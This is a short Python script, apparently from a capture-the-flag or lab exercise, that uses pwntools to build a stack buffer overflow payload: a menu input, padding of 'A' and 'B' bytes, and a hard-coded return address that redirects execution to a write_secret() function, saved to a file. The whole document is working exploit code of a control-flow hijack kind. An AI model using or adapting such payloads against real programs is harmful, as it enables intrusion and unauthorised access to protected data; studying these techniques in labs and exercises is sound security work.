from pwn import *

context.arch = 'amd64'
context.os = 'linux'

offset = 551

# Address of write_secret() method
ret_addr = 0x555555555229

payload = b"2\n"
payload += b"A" * 1022
payload += b"B" * offset
payload += p64(ret_addr)

with open("./write_secret_payload", "wb") as f:
    f.write(payload)

